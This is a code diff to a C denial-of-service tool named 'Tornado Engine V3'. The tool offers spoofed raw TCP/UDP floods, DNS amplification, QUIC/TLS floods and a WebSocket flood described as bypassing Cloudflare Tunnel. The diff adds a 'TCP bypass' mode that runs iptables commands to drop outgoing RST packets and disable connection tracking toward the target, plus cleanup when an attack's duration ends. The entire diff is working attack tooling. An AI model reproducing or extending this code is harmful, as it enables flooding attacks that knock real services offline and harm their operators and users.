@@ -47,7 +47,7 @@ void print_stats() {
     double total_mbits = (bytes * 8.0) / 1000000.0;
     last_print_bytes = bytes;
     last_print_time_ms = now_ms;
-    if ((args.is_hybrid_v15 && proxy_count <= 0) || args.is_raw_tcp || args.is_raw_udp || args.is_v16_dns_amp || args.is_v18_quic || args.is_v18_tls) {
+    if ((args.is_hybrid_v15 && proxy_count <= 0) || args.is_raw_tcp || args.is_raw_udp || args.is_v16_dns_amp || args.is_v18_quic || args.is_v18_tls || args.is_v17_tcp_bypass) {
         LOG_INFO("STATS | Packets: %llu (TCP: %llu) | Raw: %llu | Err: %llu | %.1f Mbps (%.1f Mbits total)", p, tcp, rs, se, rate_mbps, total_mbits);
     } else {
         LOG_INFO("STATS | Packets: %llu (TCP: %llu) | OK: %llu | Fail: %llu | %.1f Mbps (%.1f Mbits total)", p, tcp, s, f, rate_mbps, total_mbits);
@@ -113,11 +113,11 @@ int main(int argc, char *argv[]) {
     if (strcmp(args.mode, "raw_tcp_spoof") == 0) args.is_raw_tcp_spoof = 1;
     if (strcmp(args.mode, "raw_udp_spoof") == 0) args.is_raw_udp_spoof = 1;
     if (strstr(args.mode, "dns_v16")) args.is_v16_dns_amp = 1;
-    if (strstr(args.mode, "tcp_v17") || strstr(args.mode, "v17")) args.is_v17_tcp_bypass = 1;
-    if (strstr(args.mode, "quic_v18")) args.is_v18_quic = 1;
-    if (strstr(args.mode, "tls_v18") || strstr(args.mode, "v18_tls") || strstr(args.mode, "tls")) { args.is_v18_tls = 1; args.is_v17_tcp_bypass = 1; } // TLS uses V17 3WHS engine
-    if (strstr(args.mode, "v18_tcp")) { args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // Pure TCP: 3WHS engine, no TLS
-    if (strstr(args.mode, "stealth")) { args.is_stealth = 1; args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // AF_PACKET raw engine
+    if (strcmp(args.mode, "tcp_v17") == 0 || strcmp(args.mode, "v17") == 0) args.is_v17_tcp_bypass = 1;
+    if (strcmp(args.mode, "quic_v18") == 0) args.is_v18_quic = 1;
+    if (strcmp(args.mode, "tls_v18") == 0 || strcmp(args.mode, "v18_tls") == 0 || strcmp(args.mode, "tls") == 0) { args.is_v18_tls = 1; args.is_v17_tcp_bypass = 1; } // TLS uses V17 3WHS engine
+    if (strcmp(args.mode, "v18_tcp") == 0) { args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // Pure TCP: 3WHS engine, no TLS
+    if (strcmp(args.mode, "stealth") == 0) { args.is_stealth = 1; args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // AF_PACKET raw engine
     if (strstr(args.mode, "v20_ws")) { args.is_v20_ws = 1; } // WebSocket L7 flood (CF Tunnel bypass)
     if (strstr(args.mode, "v19_tcp")) { args.is_v19_tcp = 1; args.is_v15_raw_amp = 1; }
     if (strcmp(args.mode, "vn") == 0) { args.is_vn_tcp = 1; } // VN: SOCKS5 proxy TCP blast via epoll
@@ -146,7 +146,7 @@ int main(int argc, char *argv[]) {
         LOG_INFO("Bypassing proxies.txt as requested by --no-proxies");
     }
 
-    if (!args.is_dry_run && (args.is_hybrid_v15 || args.is_raw_udp || args.is_raw_tcp || args.is_v16_dns_amp || args.is_v18_quic || args.is_v18_tls)) {
+    if (!args.is_dry_run && (args.is_hybrid_v15 || args.is_raw_tcp || args.is_raw_udp || args.is_v16_dns_amp || args.is_v18_quic || args.is_v18_tls || args.is_v17_tcp_bypass)) {
         if (get_default_interface(args.xdp_interface, sizeof(args.xdp_interface)) == 0) {
             LOG_INFO("Detected active network interface: %s", args.xdp_interface);
             
@@ -185,13 +185,25 @@ int main(int argc, char *argv[]) {
     signal(SIGPIPE, SIG_IGN); // Prevent process from being killed when writing to broken pipe/socket
     LOG_INFO("Tornado Engine V3 Starting: %s:%d | Mode: %s", args.host, args.port, args.mode);
 
-    if (!args.is_dry_run && (args.is_hybrid_v15 || args.is_raw_tcp || args.is_raw_udp || args.is_v18_quic || args.is_v18_tls)) {
+    if (!args.is_dry_run && (args.is_hybrid_v15 || args.is_raw_tcp || args.is_raw_udp || args.is_v18_quic || args.is_v18_tls || args.is_v17_tcp_bypass)) {
         if (args.xdp_interface[0] != '\0') {
             enable_rst_drop(args.xdp_interface);
         }
     }
-    // V18 TLS TCP connection mode: limit threads
-    if (args.is_v18_tls) {
+    // V17/V18 TCP bypass: add iptables RST drop rule BEFORE spawning threads
+    if (!args.is_dry_run && args.is_v17_tcp_bypass) {
+        char rst_cmd[512];
+        snprintf(rst_cmd, sizeof(rst_cmd),
+            "iptables -C OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null || "
+            "iptables -I OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP",
+            args.target_ip, args.target_ip);
+        system(rst_cmd);
+        system("iptables -t raw -C OUTPUT -p tcp -j NOTRACK 2>/dev/null || iptables -t raw -A OUTPUT -p tcp -j NOTRACK");
+        system("iptables -t raw -C PREROUTING -p tcp -j NOTRACK 2>/dev/null || iptables -t raw -A PREROUTING -p tcp -j NOTRACK");
+        LOG_INFO("V17/V18 TCP: iptables RST drop + NOTRACK rules applied for %s", args.target_ip);
+    }
+    // V17/V18 TCP connection mode: limit threads
+    if (args.is_v17_tcp_bypass || args.is_v18_tls) {
         int max_tcp_threads = 1024;
         if (args.threads > max_tcp_threads) {
             LOG_INFO("TCP mode: threads %d -> %d (each manages %d conns for total %d)",
@@ -223,8 +235,8 @@ int main(int argc, char *argv[]) {
         long long now = get_ms();
         
         if (args.duration > 0 && (now - start_time) / 1000 >= args.duration) {
-            LOG_INFO("Time is up! Forcefully exiting process to stop attack instantly.");
-            exit(0); // KILL EVERYTHING IMMEDIAELY, NO DEADLOCKS
+            LOG_INFO("Time is up! Cleaning up and exiting.");
+            handle_sigint(0); // Clean iptables rules then exit
         }
         
         if (now - last_print >= 1000) {
